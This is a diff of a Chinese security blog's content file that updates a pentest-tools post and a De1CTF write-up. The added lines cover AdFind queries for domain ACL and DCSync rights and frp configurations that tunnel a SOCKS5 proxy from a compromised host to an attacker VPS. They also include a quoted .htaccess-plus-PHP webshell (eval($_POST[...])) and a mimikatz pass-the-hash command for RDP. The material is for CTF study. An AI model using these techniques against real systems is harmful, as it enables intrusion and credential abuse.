@@ -7,7 +7,7 @@
 <a id="more"></a>
 
 <p>参考 <a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12#0x02-acl" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ldap-pian/12#0x02-acl</a></p>
-<h2 id="4-利用adfind-过滤-ACL"><a href="#4-利用adfind-过滤-ACL" class="headerlink" title="4. 利用adfind 过滤 ACL"></a><strong>4. 利用adfind 过滤 ACL</strong></h2><p>如果想用adfind 过滤ACL的话，我们可以使用<code>-sddlfilter</code>,语法如下</p>
+<h2 id="1-利用adfind-过滤-ACL"><a href="#1-利用adfind-过滤-ACL" class="headerlink" title="1. 利用adfind 过滤 ACL"></a><strong>1. 利用adfind 过滤 ACL</strong></h2><p>如果想用adfind 过滤ACL的话，我们可以使用<code>-sddlfilter</code>,语法如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-sddlfilter ;;;;;</span><br></pre></td></tr></table></figure>
 
 <p>后面跟的参数对应的是ace条目相应的参数，值得注意的是，过滤的格式跟输出的格式要保持一致。</p>
@@ -20,14 +20,12 @@
    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC&#x3D;test,DC&#x3D;local&quot; nTSecurityDescriptor   -sddl+++   -sddlfilter ;;;;;&quot;TEST\DC2016$&quot;   -recmute</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01820587bbe037011c.png" alt="img"></p>
-<p>image-20191209212905224</p>
 <ol>
 <li>查找更改一个对象的马上到！S-AllowedToActOnBehalfOfOtherIdentity的权限</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC&#x3D;test,DC&#x3D;local&quot; nTSecurityDescriptor   -sddl++   -sddlfilter ;;;&quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;;;  -recmute</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01c5d2427249c7cca8.png" alt="img"></p>
-<p>image-20191209211825196</p>
 <ol>
 <li>查找域内具备dcync 权限的用户</li>
 </ol>
@@ -35,14 +33,27 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;DS-Replication-Get-Changes&#39;     &#x3D; 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">&#39;DS-Replication-Get-Changes-All&#39; &#x3D; 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t0190b4f7118459c867.png" alt="img"></p>
-<p>img</p>
 <p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t01783c2e12d6384581.png" alt="img"></p>
-<p>image-20200109163432815</p>
 <p>开始进行搜索</p>
 <p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t011c3a109eabb651d5.png" alt="img"></p>
-<p>image-20191209214334996</p>
 <p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/t015d193bee48b235f1.png" alt="img"></p>
-<p>image-20191209214607836</p>
+<h1 id="2-frp-内网代理"><a href="#2-frp-内网代理" class="headerlink" title="2 frp 内网代理"></a>2 frp 内网代理</h1><p>frps 运行在具有公网IP地址的VPS上</p>
+<p>frpc 运行在我们得到shell权限的肉鸡上</p>
+<p>frps  配置文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr &#x3D; 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user &#x3D; aaaa</span><br><span class="line">dashboard_pwd &#x3D; bbbb</span><br><span class="line"></span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports &#x3D; 40000-50000</span><br></pre></td></tr></table></figure>
+
+<p>frpc 配置文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr &#x3D; xxx.xx.xx.xx</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6005</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; abc</span><br><span class="line">plugin_passwd &#x3D; abc</span><br></pre></td></tr></table></figure>
+
+<p>客户端运行</p>
+<img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151014647.png" alt="image-20200506151014647" style="zoom:200%;">
+
+<p>上图客户端为win2012R2</p>
+<p>服务端运行</p>
+<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151117175.png" alt="image-20200506151117175"></p>
+<p>上面第三行表示已经建立代理</p>
+<p>之后在本地用proxifier就可以代理访问内网资源</p>
+<p><img src="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20200506151223032.png" alt="image-20200506151223032"></p>
 ]]></content>
       <tags>
         <tag>pentest</tag>
@@ -769,6 +780,10 @@
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506115401614.png" alt="image-20200506115401614"></p>
 <p>查一下php手册，我靠知识点啊。不用闭合就能用，tql。</p>
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506115509609.png" alt="image-20200506115509609"></p>
+<blockquote>
+<p>参看Nu1l的wp:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp yyy</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag On</span><br><span class="line"></span><br><span class="line">2.yyy</span><br><span class="line">&lt;? eval($_POST[2333]);</span><br></pre></td></tr></table></figure>
+</blockquote>
 <h1 id="0x02-calc"><a href="#0x02-calc" class="headerlink" title="0x02 calc"></a>0x02 calc</h1><p>通过fuzz发现报错信息，</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"timestamp"</span>:<span class="string">"2020-05-04T02:36:32.156+0000"</span>,<span class="attr">"status"</span>:<span class="number">500</span>,<span class="attr">"error"</span>:<span class="string">"Internal Server Error"</span>,<span class="attr">"message"</span>:<span class="string">"Expression [@] @0: EL1059E: @ or &amp; can only be followed by an identifier or a quoted name"</span>,<span class="attr">"path"</span>:<span class="string">"/spel/calc"</span>&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1074,7 +1089,17 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506085227520.png" alt="image-20200506085227520"></p>
-<p>可以看到上图框中的三个权限，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，进行DCShadow攻击需要打开两个mimikatz窗口，所以需要</p>
+<p>可以看到上图框中的三个权限，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，进行DCShadow攻击需要打开两个mimikatz窗口，所以需要开启远程桌面，这里利用<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>进行代理，frp使用请看另一篇文章，代理设置好之后，就可以利用这篇文章提到的<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>利用ntlm直接登录远程桌面</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:DM &#x2F;ntlm:B03094996601324646AC223BF30D0D07 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506151539110.png" alt="image-20200506151539110"></p>
+<blockquote>
+<p>Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中</p>
+<h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><ul>
+<li>Windows 8.1和Windows Server 2012 R2默认支持该功能</li>
+<li>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</li>
+</ul>
+</blockquote>
 <p><a href="https://daiker.gitbook.io/" target="_blank" rel="noopener">https://daiker.gitbook.io/</a></p>
 <p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/72190.html</a>  rdp</p>
 <p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py</a>   keburo</p>
